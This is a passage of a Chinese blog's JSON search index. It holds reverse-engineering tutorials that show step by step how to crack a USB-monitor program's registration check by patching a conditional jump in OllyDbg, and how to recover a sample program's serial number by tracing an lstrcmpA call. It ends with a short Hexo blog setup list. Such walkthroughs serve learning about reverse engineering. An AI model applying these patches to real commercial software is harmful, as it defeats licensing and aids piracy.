改为“JNE”即可。如图：右键汇编，改JE为JNE，然后汇编，右键复制到可执行文件-所有修改-全部复制，在弹框中右键保存文件，输入保存的文件名，保存即可。\n\n![](http://i.imgur.com/cyP7RUh.png)![](http://i.imgur.com/EfRZ9kk.png)![](http://i.imgur.com/O5tNd2b.png)","tags":["逆向"],"categories":["逆向"]},{"title":"破解实例1","url":"/2017/07/06/逆向/破解实例1/","content":"\n一、样本基本信息\n\nU盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe\n\n二、分析过程\n\n首先打开u盘监控器，获取注册关键信息， 如下的\"注册失败”即为关键信息\n![](http://i.imgur.com/MyGKNqI.png)![](http://i.imgur.com/8Gbifid.png)\n\n使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是\n文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图\"注册失败\"的文件偏移地址为0x00081A79 \n\n![](http://i.imgur.com/QphmGr2.png)\n\n使用OD获取该字符串的内存地址\n内存地址等于装载基址+文件偏移地址\n装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找/常量  输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d \n\n![](http://i.imgur.com/TLYbq9H.png)\n\n使用W32DASM  找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2\n\n![](http://i.imgur.com/i6lv5P1.png)![](http://i.imgur.com/RZjGkZP.png)\n\n在OD中找到此地址位置，右键汇编于此处，jg 改为jl 然后复制到二进制文件，保存文件即可。\n\n![](http://i.imgur.com/wAmnWPj.png)","tags":["逆向"],"categories":["逆向"]},{"title":"破解实例3","url":"/2017/07/06/逆向/破解实例3/","content":"\n\n一、样本基本信息\n\n破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1\n\n二、分析过程\n\n首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下\n\n ![](./img/pojie3/1.png) \n![](http://i.imgur.com/1iVDBXu.png)\n\n打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串。\n\n ![](./img/pojie3/3.png)\n\n发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。\n\n![](http://i.imgur.com/pyR9pcq.png) \n\n![](http://i.imgur.com/9RHvbDN.png)\n\n打开OD找到这个位置。\n此时我们在这个位置下断点运行程序，输入字符串“111111”，和“222222”，发现在堆栈区的字符串为“2009”和”222222“，故猜测字符串”111111“经过运算，得到2009然后和222222，进行比较，如果相等，即成功。实际测试发现果然如此。\n  ![](http://i.imgur.com/bEuszv9.png)\n  ![](http://i.imgur.com/Pg80kAA.png)\n  ![](http://i.imgur.com/TBQZMkt.png)\n","tags":["逆向"],"categories":["逆向"]},{"title":"hexo 搭建博客(github)","url":"/2017/07/05/杂学/搭建博客/","content":"#### 步骤如下\n1、新建仓库 username.github.io \n\n2、新建read.me\n\n3、安装node.js\n4、安装git\n\n5、安装hexo\n\n6、修改hexo 的配置文件，和github仓库建立关联\n\n7、购买域名，绑定username.github.io\n\n8、发布博客 hexo clean &&hexo g &&hexo d\n\n9、修改主题 [详见](https://www.haomwei.com/technology/maupassant-hexo.html)\n\n10、加入评论和订阅功能 （gittalk）\n\n","tags":["杂学"],"categories":["杂学"]}]